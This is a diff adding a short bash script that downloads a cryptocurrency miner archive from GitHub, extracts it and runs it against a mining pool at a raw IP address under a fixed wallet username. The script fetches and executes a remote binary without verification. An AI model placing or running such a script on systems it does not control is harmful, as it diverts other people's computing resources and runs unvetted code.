@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/TRRXITTE/miner/releases/download/0.0.1/TRRXITTEminer-0.0.1-unix-ubuntu-20.04.tar.xz
+tar xf TRRXITTEminer-0.0.1-unix-ubuntu-20.04.tar.xz
+./TRRXITTEminer --disableNVIDIA --pool 168.235.86.33:3393 --username SK_QzApkbVGsAxyQykaWSnEF.novalanto --password x --algorithm wrkzcoin
